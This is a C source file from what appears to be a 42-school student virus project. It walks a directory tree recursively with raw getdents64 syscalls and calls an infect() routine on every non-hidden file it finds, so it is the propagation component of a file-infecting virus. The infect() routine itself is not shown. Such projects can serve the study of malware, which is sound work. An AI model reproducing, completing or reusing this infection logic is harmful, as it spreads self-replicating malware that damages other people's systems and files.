/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   file_iterator.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:14 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/27 01:44:21 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <limits.h>

#include "syscall.h"
#include "utils.h"
#include "virus.h"

static void	infect_files_at(char path[PATH_MAX], char *path_end);

static void	browse_dirent(char path[PATH_MAX], char *path_end, \
			const char buff[1024], int nread)
{
	for (int bpos = 0; bpos < nread;)
	{
		struct dirent64 *file = (struct dirent64*)(buff + bpos);

		strcpy(path_end, file->d_name);
		if (file->d_name[0] != '.') // we respect your privacy ;)
		{
			if (file->d_type == DT_DIR)
				infect_files_at(path, path_end + strlen(file->d_name));
			else
				infect(path);
		}
		bpos += file->d_reclen;
	}
}

static void	infect_files_at(char path[PATH_MAX], char *path_end)
{
	char		buff[1024];
	int		fd = sys_open(path, O_RDONLY);
	int		nread;

	if (fd < 0) return;

	*path_end++ = '/';
	while ((nread = sys_getdents64(fd, (void*)buff, 1024)) > 0)
		browse_dirent(path, path_end, buff, nread);
	sys_close(fd);
}

inline void		infect_files_in(const char *root_dir)
{
	char	path[PATH_MAX];

	strcpy(path, root_dir);
	infect_files_at(path, path + strlen(root_dir));
}
